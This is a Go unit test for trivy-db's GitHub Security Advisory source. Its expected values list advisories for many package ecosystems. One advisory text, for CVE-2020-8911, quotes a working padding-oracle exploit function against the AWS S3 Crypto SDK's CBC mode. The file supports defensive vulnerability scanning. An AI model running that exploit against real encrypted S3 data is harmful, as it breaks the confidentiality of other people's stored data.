package ghsa

import (
	"path/filepath"
	"testing"

	"github.com/aquasecurity/trivy-db/pkg/types"
	"github.com/aquasecurity/trivy-db/pkg/vulnsrc/vulnerability"
	"github.com/aquasecurity/trivy-db/pkg/vulnsrctest"
)

func TestVulnSrc_Update(t *testing.T) {
	tests := []struct {
		name       string
		dir        string
		wantValues []vulnsrctest.WantValues
		wantErr    string
	}{
		{
			name: "happy path",
			dir:  filepath.Join("testdata", "happy"),
			wantValues: []vulnsrctest.WantValues{
				{
					Key: []string{"data-source", "composer::GitHub Security Advisory Composer"},
					Value: types.DataSource{
						ID:   vulnerability.GHSA,
						Name: "GitHub Security Advisory Composer",
						URL:  "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Acomposer",
					},
				},
				{
					Key: []string{"advisory-detail", "CVE-2019-19745", "composer::GitHub Security Advisory Composer", "contao/core-bundle"},
					Value: types.Advisory{
						PatchedVersions:    []string{"4.8.6", "4.4.46"},
						VulnerableVersions: []string{"\u003e= 4.5.0, \u003c 4.8.6", "\u003e= 4.0.0, \u003c 4.4.46"},
					},
				},
				{
					Key: []string{"vulnerability-detail", "CVE-2019-19745", ghsaDir},
					Value: types.VulnerabilityDetail{
						ID:          "CVE-2019-19745",
						Title:       "Unrestricted file uploads in Contao",
						Description: "### Impact\n\nA back end user with access to the form generator can upload arbitrary files and execute them on the server.\n\n### Patches\n\nUpdate to Contao 4.4.46 or 4.8.6.\n\n### Workarounds\n\nConfigure your web server so it does not execute PHP files and other scripts in the Contao file upload directory.\n\n### References\n\nhttps://contao.org/en/security-advisories/unrestricted-file-uploads.html\n\n### For more information\n\nIf you have any questions or comments about this advisory, open an issue in [contao/contao](https://github.com/contao/contao/issues/new/choose).",
						References: []string{
							"https://github.com/contao/contao/security/advisories/GHSA-wjx8-cgrm-hh8p",
							"https://nvd.nist.gov/vuln/detail/CVE-2019-19745",
							"https://contao.org/en/news.html",
							"https://contao.org/en/security-advisories/unrestricted-file-uploads.html",
							"https://github.com/FriendsOfPHP/security-advisories/blob/master/contao/core-bundle/CVE-2019-19745.yaml",
							"https://github.com/advisories/GHSA-wjx8-cgrm-hh8p",
						},
						Severity:     types.SeverityHigh,
						CvssScoreV3:  8.8,
						CvssVectorV3: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
					},
				},
				{
					Key:   []string{"vulnerability-id", "CVE-2019-19745"},
					Value: map[string]interface{}{},
				},
				{
					Key: []string{"data-source", "maven::GitHub Security Advisory Maven"},
					Value: types.DataSource{
						ID:   vulnerability.GHSA,
						Name: "GitHub Security Advisory Maven",
						URL:  "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven",
					},
				},
				{
					Key: []string{"advisory-detail", "CVE-2018-1196", "maven::GitHub Security Advisory Maven", "org.springframework.boot:spring-boot"},
					Value: types.Advisory{
						PatchedVersions:    []string{"1.5.10"},
						VulnerableVersions: []string{"\u003e= 1.5.0, \u003c 1.5.10"},
					},
				},
				{
					Key: []string{"vulnerability-detail", "CVE-2018-1196", ghsaDir},
					Value: types.VulnerabilityDetail{
						ID:          "CVE-2018-1196",
						Title:       "Moderate severity vulnerability that affects org.springframework.boot:spring-boot",
						Description: "Spring Boot supports an embedded launch script that can be used to easily run the application as a systemd or init.d linux service. The script included with Spring Boot 1.5.9 and earlier and 2.0.0.M1 through 2.0.0.M7 is susceptible to a symlink attack which allows the \"run_user\" to overwrite and take ownership of any file on the same system. In order to instigate the attack, the application must be installed as a service and the \"run_user\" requires shell access to the server. Spring Boot application that are not installed as a service, or are not using the embedded launch script are not susceptible.",
						References: []string{
							"https://nvd.nist.gov/vuln/detail/CVE-2018-1196",
							"https://github.com/advisories/GHSA-xx65-cc7g-9pfp",
							"https://pivotal.io/security/cve-2018-1196",
						},
						Severity:     types.SeverityMedium,
						CvssScoreV3:  5.9,
						CvssVectorV3: "CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N",
					},
				},
				{
					Key:   []string{"vulnerability-id", "CVE-2018-1196"},
					Value: map[string]interface{}{},
				},
				{
					Key: []string{"data-source", "npm::GitHub Security Advisory Npm"},
					Value: types.DataSource{
						ID:   vulnerability.GHSA,
						Name: "GitHub Security Advisory Npm",
						URL:  "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm",
					},
				},
				{
					Key: []string{"advisory-detail", "CVE-2018-3745", "npm::GitHub Security Advisory Npm", "atob"},
					Value: types.Advisory{
						PatchedVersions:    []string{"2.1.0"},
						VulnerableVersions: []string{"\u003c 2.1.0"},
					},
				},
				{
					Key: []string{"vulnerability-detail", "CVE-2018-3745", ghsaDir},
					Value: types.VulnerabilityDetail{
						ID:          "CVE-2018-3745",
						Title:       "Out-of-bounds Read in atob",
						Description: "Versions of `atob` before 2.1.0  uninitialized Buffers when number is passed in input on Node.js 4.x and below.\n\n\n## Recommendation\n\nUpdate to version 2.1.0 or later.",
						References: []string{
							"https://nvd.nist.gov/vuln/detail/CVE-2018-3745",
							"https://hackerone.com/reports/321686",
							"https://github.com/advisories/GHSA-8w4h-3cm3-2pm2",
							"https://www.npmjs.com/advisories/646",
						},
						Severity: types.SeverityMedium,
					},
				},
				{
					Key:   []string{"vulnerability-id", "CVE-2018-3745"},
					Value: map[string]interface{}{},
				},
				{
					Key: []string{"data-source", "nuget::GitHub Security Advisory Nuget"},
					Value: types.DataSource{
						ID:   vulnerability.GHSA,
						Name: "GitHub Security Advisory Nuget",
						URL:  "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anuget",
					},
				},
				{
					Key: []string{"advisory-detail", "CVE-2019-1010113", "nuget::GitHub Security Advisory Nuget", "CLEditor"},
					Value: types.Advisory{
						VulnerableVersions: []string{"\u003c= 1.4.5"},
					},
				},
				{
					Key: []string{"vulnerability-detail", "CVE-2019-1010113", ghsaDir},
					Value: types.VulnerabilityDetail{
						ID:          "CVE-2019-1010113",
						Title:       "Moderate severity vulnerability that affects CLEditor",
						Description: "Premium Software CLEditor 1.4.5 and earlier is affected by: Cross Site Scripting (XSS). The impact is: An attacker might be able to inject arbitrary html and script code into the web site. The component is: jQuery plug-in. The attack vector is: the victim must open a crafted href attribute of a link (A) element.",
						References: []string{
							"https://nvd.nist.gov/vuln/detail/CVE-2019-1010113",
						},
						Severity: types.SeverityMedium,
					},
				},
				{
					Key:   []string{"vulnerability-id", "CVE-2019-1010113"},
					Value: map[string]interface{}{},
				},
				{
					Key: []string{"data-source", "pip::GitHub Security Advisory Pip"},
					Value: types.DataSource{
						ID:   vulnerability.GHSA,
						Name: "GitHub Security Advisory Pip",
						URL:  "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip",
					},
				},
				{
					Key: []string{"advisory-detail", "CVE-2018-14574", "pip::GitHub Security Advisory Pip", "django"},
					Value: types.Advisory{
						PatchedVersions:    []string{"2.0.8", "1.11.15"},
						VulnerableVersions: []string{"\u003e= 2.0, \u003c 2.0.8", "\u003e= 1.11.0, \u003c 1.11.15"},
					},
				},
				{
					Key: []string{"vulnerability-detail", "CVE-2018-14574", ghsaDir},
					Value: types.VulnerabilityDetail{
						ID:          "CVE-2018-14574",
						Title:       "Moderate severity vulnerability that affects django",
						Description: "django.middleware.common.CommonMiddleware in Django 1.11.x before 1.11.15 and 2.0.x before 2.0.8 has an Open Redirect.",
						References: []string{
							"https://nvd.nist.gov/vuln/detail/CVE-2018-14574",
							"https://access.redhat.com/errata/RHSA-2019:0265",
							"https://github.com/advisories/GHSA-5hg3-6c2f-f3wr",
							"https://usn.ubuntu.com/3726-1/",
							"https://www.debian.org/security/2018/dsa-4264",
							"https://www.djangoproject.com/weblog/2018/aug/01/security-releases/",
							"http://www.securityfocus.com/bid/104970",
							"http://www.securitytracker.com/id/1041403",
						},
						Severity:     types.SeverityMedium,
						CvssScoreV3:  6.1,
						CvssVectorV3: "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
					},
				},
				{
					Key:   []string{"vulnerability-id", "CVE-2018-14574"},
					Value: map[string]interface{}{},
				},
				{
					Key: []string{"data-source", "rubygems::GitHub Security Advisory Rubygems"},
					Value: types.DataSource{
						ID:   vulnerability.GHSA,
						Name: "GitHub Security Advisory Rubygems",
						URL:  "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arubygems",
					},
				},
				{
					Key: []string{"advisory-detail", "CVE-2018-16477", "rubygems::GitHub Security Advisory Rubygems", "activestorage"},
					Value: types.Advisory{
						PatchedVersions:    []string{"5.2.1.1"},
						VulnerableVersions: []string{"\u003e= 5.2.0, \u003c= 5.2.1.0"},
					},
				},
				{
					Key: []string{"vulnerability-detail", "CVE-2018-16477", ghsaDir},
					Value: types.VulnerabilityDetail{
						ID:          "CVE-2018-16477",
						Title:       "High severity vulnerability that affects activestorage",
						Description: "A bypass vulnerability in Active Storage >= 5.2.0 for Google Cloud Storage and Disk services allow an attacker to modify the `content-disposition` and `content-type` parameters which can be used in with HTML files and have them executed inline. Additionally, if combined with other techniques such as cookie bombing and specially crafted AppCache manifests, an attacker can gain access to private signed URLs within a specific storage path.",
						References: []string{
							"https://nvd.nist.gov/vuln/detail/CVE-2018-16477",
							"https://github.com/advisories/GHSA-7rr7-rcjw-56vj",
							"https://groups.google.com/d/msg/rubyonrails-security/3KQRnXDIuLg/mByx5KkqBAAJ",
							"https://weblog.rubyonrails.org/2018/11/27/Rails-4-2-5-0-5-1-5-2-have-been-released/",
						},
						Severity:     types.SeverityMedium,
						CvssScoreV3:  6.5,
						CvssVectorV3: "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N",
					},
				},
				{
					Key:   []string{"vulnerability-id", "CVE-2018-16477"},
					Value: map[string]interface{}{},
				},
				{
					Key: []string{"data-source", "cargo::GitHub Security Advisory Rust"},
					Value: types.DataSource{
						ID:   vulnerability.GHSA,
						Name: "GitHub Security Advisory Rust",
						URL:  "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arust",
					},
				},
				{
					Key: []string{"advisory-detail", "CVE-2020-26235", "cargo::GitHub Security Advisory Rust", "time"},
					Value: types.Advisory{
						PatchedVersions:    []string{"0.2.23"},
						VulnerableVersions: []string{"\u003e= 0.2.7, \u003c 0.2.23"},
					},
				},
				{
					Key: []string{"vulnerability-detail", "CVE-2020-26235", ghsaDir},
					Value: types.VulnerabilityDetail{
						ID:          "CVE-2020-26235",
						Title:       "Segmentation fault in time",
						Description: "### Impact\n\nUnix-like operating systems may segfault due to dereferencing a dangling pointer in specific circumstances. This requires an environment variable to be set in a different thread than the affected functions. This may occur without the user's knowledge, notably in a third-party library.\n\nThe affected functions from time 0.2.7 through 0.2.22 are:\n\n- `time::UtcOffset::local_offset_at`\n- `time::UtcOffset::try_local_offset_at`\n- `time::UtcOffset::current_local_offset`\n- `time::UtcOffset::try_current_local_offset`\n- `time::OffsetDateTime::now_local`\n- `time::OffsetDateTime::try_now_local`\n\nThe affected functions in time 0.1 (all versions) are:\n\n- `at`\n- `at_utc`\n- `now`\n\nNon-Unix targets (including Windows and wasm) are unaffected.\n\n### Patches\n\nIn some versions of time`, the internal method that determines the local offset has been modified to always return `None` on the affected operating systems. This has the effect of returning an `Err` on the `try_*` methods and `UTC` on the non-`try_*` methods. In later versions, `time` will attempt to determine the number of threads running in the process. If the process is single-threaded, the call will proceed as its safety invariant is upheld.\n\nUsers and library authors with time in their dependency tree must perform `cargo update`, which will pull in the updated, unaffected code.\n\nUsers of time 0.1 do not have a patch and must upgrade to an unaffected version: time 0.2.23 or greater or the 0.3 series.\n\n### Workarounds\n\nLibrary authors must ensure that the program only has one running thread at the time of calling any affected method. Binary authors may do the same and/or ensure that no other thread is actively mutating the environment.\n\n### References\n\ntime-rs/time#293",
						References: []string{
							"https://github.com/time-rs/time/security/advisories/GHSA-wcg3-cvx6-7396",
							"https://nvd.nist.gov/vuln/detail/CVE-2020-26235",
							"https://github.com/time-rs/time/issues/293",
							"https://rustsec.org/advisories/RUSTSEC-2020-0071.html",
							"https://crates.io/crates/time/0.2.23",
							"https://github.com/advisories/GHSA-wcg3-cvx6-7396",
						},
						Severity:     types.SeverityMedium,
						CvssScoreV3:  6.2,
						CvssVectorV3: "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
					},
				},
				{
					Key:   []string{"vulnerability-id", "CVE-2020-26235"},
					Value: map[string]interface{}{},
				},
				{
					Key: []string{"data-source", "erlang::GitHub Security Advisory Erlang"},
					Value: types.DataSource{
						ID:   vulnerability.GHSA,
						Name: "GitHub Security Advisory Erlang",
						URL:  "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Aerlang",
					},
				},
				{
					Key: []string{"advisory-detail", "CVE-2017-1000212", "erlang::GitHub Security Advisory Erlang", "alchemist.vim"},
					Value: types.Advisory{
						PatchedVersions:    []string{"1.3.2"},
						VulnerableVersions: []string{"\u003c= 1.3.1"},
					},
				},
				{
					Key: []string{"vulnerability-detail", "CVE-2017-1000212", ghsaDir},
					Value: types.VulnerabilityDetail{
						ID:          "CVE-2017-1000212",
						Title:       "alchemist.vim vulnerable to remote code execution",
						Description: "Elixir's vim plugin, alchemist.vim is vulnerable to remote code execution in the bundled alchemist-server. A malicious website can execute requests against an ephemeral port on localhost that are then evaluated as elixir code.",
						References: []string{
							"https://nvd.nist.gov/vuln/detail/CVE-2017-1000212",
							"https://github.com/tonini/alchemist-server/issues/14",
							"https://github.com/tonini/alchemist-server/pull/16",
							"https://elixirforum.com/t/static-and-session-security-fixes-for-plug/3913",
							"https://github.com/advisories/GHSA-6x65-vqp7-5r63",
						},
						Severity:     types.SeverityCritical,
						CvssScoreV3:  9.8,
						CvssVectorV3: "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
					},
				},
				{
					Key:   []string{"vulnerability-id", "CVE-2017-1000212"},
					Value: map[string]interface{}{},
				},
				{
					Key: []string{"data-source", "go::GitHub Security Advisory Go"},
					Value: types.DataSource{
						ID:   vulnerability.GHSA,
						Name: "GitHub Security Advisory Go",
						URL:  "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago",
					},
				},
				{
					Key: []string{"advisory-detail", "CVE-2020-8911", "go::GitHub Security Advisory Go", "github.com/aws/aws-sdk-go"},
					Value: types.Advisory{
						PatchedVersions:    []string{"1.34.0"},
						VulnerableVersions: []string{"\u003c 1.34.0"},
					},
				},
				{
					Key: []string{"vulnerability-detail", "CVE-2020-8911", ghsaDir},
					Value: types.VulnerabilityDetail{
						ID:          "CVE-2020-8911",
						Title:       "CBC padding oracle issue in AWS S3 Crypto SDK for golang",
						Description: "### Summary\n\nThe golang AWS S3 Crypto SDK is impacted by an issue that can result in loss of confidentiality and message forgery. The attack requires write access to the bucket in question, and that the attacker has access to an endpoint that reveals decryption failures (without revealing the plaintext) and that when encrypting the CBC option was chosen as content cipher.\n\n### Risk/Severity\n\nThe vulnerability pose insider risks/privilege escalation risks, circumventing KMS controls for stored data.\n\n### Impact\n\nThis advisory describes the plaintext revealing vulnerabilities in the golang AWS S3 Crypto SDK, with a similar issue in the non \"strict\" versions of C++ and Java S3 Crypto SDKs being present as well.\n\nV1 prior to 1.34.0 of the S3 crypto SDK, allows users to encrypt files with AES-CBC, without computing a MAC on the data. Note that there is an alternative option of using AES-GCM, which is used in the examples of the documentation and not affected by this vulnerability, but by CVE-2020-8912.\n\nThis exposes a padding oracle vulnerability: If the attacker has write access to the S3 bucket and can observe whether or not an endpoint with access to the key can decrypt a file (without observing the file contents that the endpoint learns in the process), they can reconstruct the plaintext with (on average) `128*length(plaintext)` queries to the endpoint, by exploiting CBC's ability to manipulate the bytes of the next block and PKCS5 padding errors.\n\nThis issue is fixed in V2 of the API, by disabling encryption with CBC mode for new files. Old files, if they have been encrypted with CBC mode, remain vulnerable until they are reencrypted with AES-GCM.\n\n### Mitigation\n\nUsing the version 2 of the S3 crypto SDK will not produce vulnerable files anymore. Old files remain vulnerable to this problem if they were originally encrypted with CBC mode.\n\n### Proof of concept\n\nA [Proof of concept](https://github.com/sophieschmieg/exploits/tree/master/aws_s3_crypto_poc) is available in a separate github repository.\n\nThis particular issue is described in [padding_oracle_exploit.go](https://github.com/sophieschmieg/exploits/blob/master/aws_s3_crypto_poc/exploit/padding_oracle_exploit.go):\n\n```golang\nfunc PaddingOracleExploit(bucket string, key string, input *OnlineAttackInput) (string, error) {\n\tdata, header, err := input.S3Mock.GetObjectDirect(bucket, key)\n\tif alg := header.Get(\"X-Amz-Meta-X-Amz-Cek-Alg\"); alg != \"AES/CBC/PKCS5Padding\" {\n\t\treturn \"\", fmt.Errorf(\"Algorithm is %q, not CBC!\", alg)\n\t}\n\tlength, err := strconv.Atoi(header.Get(\"X-Amz-Meta-X-Amz-Unencrypted-Content-Length\"))\n\tpadding := byte(len(data) - length)\n\tplaintext := make([]byte, length)\n\tfor i := length - 1; i >= 0; i-- {\n\t\tnewLength := 16 * (i/16 + 1)\n\t\tdataCopy := make([]byte, newLength)\n\t\theaderCopy := header.Clone()\n\t\tcopy(dataCopy, data)\n\t\t// Set Padding\n\t\tnewPadding := byte(newLength - i)\n\t\tfor j := i + 1; j < newLength; j++ {\n\t\t\tvar oldValue byte\n\t\t\tif j >= length {\n\t\t\t\toldValue = padding\n\t\t\t} else {\n\t\t\t\toldValue = plaintext[j]\n\t\t\t}\n\t\t\tdataCopy, headerCopy, err = xorData(oldValue^newPadding, j, dataCopy, headerCopy)\n\t\t\tif err != nil {\n\t\t\t\treturn \"\", err\n\t\t\t}\n\t\t}\n\t\t// Guess\n\t\tfor c := 0; c < 256; c++ {\n\t\t\tdataCopy, headerCopy, err := xorData(byte(c)^newPadding, i, dataCopy, headerCopy)\n\t\t\tinput.S3Mock.PutObjectDirect(bucket, key+\"guess\", dataCopy, headerCopy)\n\t\t\tif input.Oracle(bucket, key+\"guess\") {\n\t\t\t\tplaintext[i] = byte(c)\n\t\t\t\tbreak\n\t\t\t}\n\t\t\tdataCopy, headerCopy, err = xorData(byte(c)^newPadding, i, dataCopy, headerCopy)\n\t\t}\n\t}\n\treturn string(plaintext), nil\n}\n```",
						References: []string{
							"https://github.com/google/security-research/security/advisories/GHSA-f5pg-7wfw-84q9",
							"https://nvd.nist.gov/vuln/detail/CVE-2020-8911",
							"https://github.com/aws/aws-sdk-go/pull/3403",
							"https://github.com/aws/aws-sdk-go/commit/1e84382fa1c0086362b5a4b68e068d4f8518d40e",
							"https://github.com/aws/aws-sdk-go/commit/ae9b9fd92af132cfd8d879809d8611825ba135f4",
							"https://aws.amazon.com/blogs/developer/updates-to-the-amazon-s3-encryption-client/?s=09",
							"https://bugzilla.redhat.com/show_bug.cgi?id=1869800",
							"https://github.com/sophieschmieg/exploits/tree/master/aws_s3_crypto_poc",
							"https://pkg.go.dev/vuln/GO-2022-0646",
							"https://github.com/advisories/GHSA-f5pg-7wfw-84q9",
						},
						Severity:     types.SeverityMedium,
						CvssScoreV3:  5.6,
						CvssVectorV3: "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:C/C:H/I:N/A:N",
					},
				},
				{
					Key:   []string{"vulnerability-id", "CVE-2020-8911"},
					Value: map[string]interface{}{},
				},
				{
					Key: []string{"data-source", "pub::GitHub Security Advisory Pub"},
					Value: types.DataSource{
						ID:   vulnerability.GHSA,
						Name: "GitHub Security Advisory Pub",
						URL:  "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apub",
					},
				},
				{
					Key: []string{"advisory-detail", "CVE-2020-35669", "pub::GitHub Security Advisory Pub", "http"},
					Value: types.Advisory{
						PatchedVersions:    []string{"0.13.3"},
						VulnerableVersions: []string{"\u003c 0.13.3"},
					},
				},
				{
					Key: []string{"vulnerability-detail", "CVE-2020-35669", ghsaDir},
					Value: types.VulnerabilityDetail{
						ID:          "CVE-2020-35669",
						Title:       "http before 0.13.3 vulnerable to header injection",
						Description: `An issue was discovered in the http package before 0.13.3 for Dart. If the attacker controls the HTTP method and the app is using Request directly, it's possible to achieve CRLF injection in an HTTP request via HTTP header injection. This issue has been addressed in commit abb2bb182 by validating request methods.`,
						References: []string{
							"https://nvd.nist.gov/vuln/detail/CVE-2020-35669",
							"https://github.com/dart-lang/http/issues/511",
							"https://github.com/dart-lang/http/blob/master/CHANGELOG.md#0133",
							"https://github.com/dart-lang/http/pull/512",
							"https://github.com/dart-lang/http/commit/abb2bb182fbd7f03aafd1f889b902d7b3bdb8769",
							"https://pub.dev/packages/http/changelog#0133",
							"https://github.com/advisories/GHSA-4rgh-jx4f-qfcq",
						},
						Severity:     types.SeverityMedium,
						CvssScoreV3:  6.1,
						CvssVectorV3: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
					},
				},
				{
					Key:   []string{"vulnerability-id", "CVE-2020-35669"},
					Value: map[string]interface{}{},
				},
				{
					Key: []string{"data-source", "swift::GitHub Security Advisory Swift"},
					Value: types.DataSource{
						ID:   vulnerability.GHSA,
						Name: "GitHub Security Advisory Swift",
						URL:  "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Aswift",
					},
				},
				{
					Key: []string{"advisory-detail", "CVE-2022-3215", "swift::GitHub Security Advisory Swift", "github.com/apple/swift-nio"},
					Value: types.Advisory{
						PatchedVersions:    []string{"2.29.1", "2.39.1", "2.42.0"},
						VulnerableVersions: []string{"\u003c 2.29.1", "\u003e= 2.39.0, \u003c 2.39.1", "\u003e= 2.41.0, \u003c 2.42.0"},
					},
				},
				{
					Key: []string{"vulnerability-detail", "CVE-2022-3215", ghsaDir},
					Value: types.VulnerabilityDetail{
						ID:          "CVE-2022-3215",
						Title:       "SwiftNIO vulnerable to Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting')",
						Description: "`NIOHTTP1` and projects using it for generating HTTP responses, including SwiftNIO, can be subject to a HTTP Response Injection attack...",
						References: []string{
							"https://github.com/apple/swift-nio/security/advisories/GHSA-7fj7-39wj-c64f",
							"https://nvd.nist.gov/vuln/detail/CVE-2022-3215",
							"https://github.com/apple/swift-nio/commit/a16e2f54a25b2af217044e5168997009a505930f",
							"https://github.com/advisories/GHSA-7fj7-39wj-c64f",
						},
						Severity:     types.SeverityMedium,
						CvssScoreV3:  5.3,
						CvssVectorV3: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
					},
				},
				{
					Key:   []string{"vulnerability-id", "CVE-2022-3215"},
					Value: map[string]interface{}{},
				},
			},
		},
		{
			name:    "sad path (dir doesn't exist)",
			dir:     filepath.Join("testdata", "badPath"),
			wantErr: "no such file or directory",
		},
		{
			name:    "sad path (failed to decode)",
			dir:     filepath.Join("testdata", "sad"),
			wantErr: "failed to decode GHSA",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			vs := NewVulnSrc()
			vulnsrctest.TestUpdate(t, vs, vulnsrctest.TestUpdateArgs{
				Dir:        tt.dir,
				WantValues: tt.wantValues,
				WantErr:    tt.wantErr,
			})
		})
	}
}
